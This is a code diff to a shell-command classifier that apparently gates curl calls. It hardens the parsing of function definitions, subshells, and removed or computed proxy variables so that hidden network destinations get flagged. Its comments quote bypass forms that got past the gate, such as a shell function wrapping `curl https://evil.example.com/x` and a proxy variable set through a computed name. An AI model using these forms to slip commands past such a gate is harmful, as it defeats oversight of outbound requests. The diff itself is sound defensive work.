@@ -300,9 +300,12 @@ export function commandIndex(mw) {
     // `f(){ curl https://evil.example.com/x; }; f` passed the live gate: the command word read was
     // `f(){` (dexter, card d6b95892). Forms: `f(){`, `f()`, zsh `f () {`, `function f [()] {`.
     if (mw[i] === 'function') { i += 2; continue }
-    if (/^\(\)\{?$/.test(mw[i + 1] ?? '') && !/^\(\)/.test(mw[i])) { i += 2; continue }
-    if (/^[^=]*\(\)\{?$/.test(mw[i])) { i++; continue }
-    const p = mw[i].split('/').pop()
+    if (/^\(\)[{(]?$/.test(mw[i + 1] ?? '') && !/^\(\)/.test(mw[i])) { i += 2; continue }
+    if (/^[^=]*\(\)[{(]?$/.test(mw[i])) { i++; continue }
+    // a body's opener standing alone (`f () ( curl`): the command is the next word
+    if (/^[({]$/.test(mw[i])) { i++; continue }
+    // `(command curl ...)`: a subshell's `(` is no part of the name (didi 36034)
+    const p = normalizedName(mw[i])
     if (!PREFIX_WORDS.has(p)) break
     i++
     if (!PREFIX_COMMANDS.has(p)) continue
@@ -796,6 +799,12 @@ const CURLRC = /curlrc|CURL_HOME|XDG_CONFIG_HOME/
 // every URL, a localhost one too (didi 36014). Named on the line, it is a destination the argv never
 // shows. `no_proxy` only narrows where a proxy is used.
 const PROXY_ENV = /(?:^|[^A-Za-z0-9_])(?!no_proxy)[A-Za-z0-9]*_proxy(?![A-Za-z0-9_])/i
+// Taking a proxy variable away (`unset http_proxy`, `env -u HTTPS_PROXY`) points curl nowhere new.
+const PROXY_REMOVED = /(?:^|[\s;&|(])(?:unset(?:\s+-[fv])?(?:\s+[A-Za-z0-9_]+)+|env(?:\s+(?:-u\s*|--unset[=\s])[A-Za-z0-9_]+)+)/g
+// A variable whose NAME is computed (`export ${v}proxy=...`, `env "$n=..." curl`, `declare -x "${p}=..."`,
+// `printf -v "$n" ...`): which variable it sets is not read, and a proxy one points curl elsewhere
+// (didi 36034, measured live). On a curl line it is an unknown destination.
+const COMPUTED_ENV_NAME = /(?:^|[\s;&|(])(?:(?:export|declare|typeset|readonly|local|env)(?:\s+-\w+)*(?:\s+[^\s=;&|]+=\S*)*\s+[^\s=;&|]*[$`][^\s=;&|]*=|printf\s+-v\s*[^\s;&|]*[$`])/
 // `ctx`: { unread: names written unread (unreadNames), text: the whole command, arrays: collectArrays }.
 export function curlDestinations(args, inners = null, fileValues = null, ctx = null) {
   const dests = []
@@ -807,7 +816,8 @@ export function curlDestinations(args, inners = null, fileValues = null, ctx = n
   })
   const said = ctx?.text ? String(ctx.text).replace(/['"\\]/g, '') : ''
   if (CURLRC.test(said)) dests.push('<curlrc>')
-  if (PROXY_ENV.test(said)) dests.push('<proxy variable>')
+  if (PROXY_ENV.test(said.replace(PROXY_REMOVED, ' '))) dests.push('<proxy variable>')
+  if (COMPUTED_ENV_NAME.test(said)) dests.push('<computed variable name>')
   const unreadVar = (part) => {
     if (!ctx?.unread?.size) return false
     for (const m of part.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)/g)) if (ctx.unread.has(m[1])) return true
@@ -1403,8 +1413,11 @@ const ASSIGNED_FROM_SUBST = /(?:^|[\s;&|(])(?:export\s+|local\s+|readonly\s+|dec
 // `inherited`: the assignments and loop values of the line this text is part of ({ env, loops, untrusted, unread, arrays }).
 // A substitution runs in the loop it sits in, so `for u in URL; do echo "$(curl $u)"; done` reads
 // the inner curl with u bound (card c8b1ccbf, shape 6: live on 2026-10-15, four requests went out).
+// A function body glued to its head (`f()(curl ...)`, `function f()(curl`, `f ()(g()(curl`): a space
+// after the opener makes the head a word of its own, so commandIndex steps over it (didi 36014, 36034).
+const GLUED_FUNCTION_BODY = /(\(\)\s*)([({])(?=[^\s)}])/g
 export function classify(command, depth = 0, vendorHosts = new Set(), vendorDomains = new Set(), substituted = false, inherited = null) {
-  const norm = String(command ?? '').replace(/\\\r?\n/g, ' ')
+  const norm = String(command ?? '').replace(/\\\r?\n/g, ' ').replace(GLUED_FUNCTION_BODY, '$1$2 ')
   const { stripped: orig, marked, inners, innerAt, herestrings } = liftSubstitutions(norm)
   const masked = maskInertLiterals(orig)
   if (masked === null || masked.length !== orig.length) {
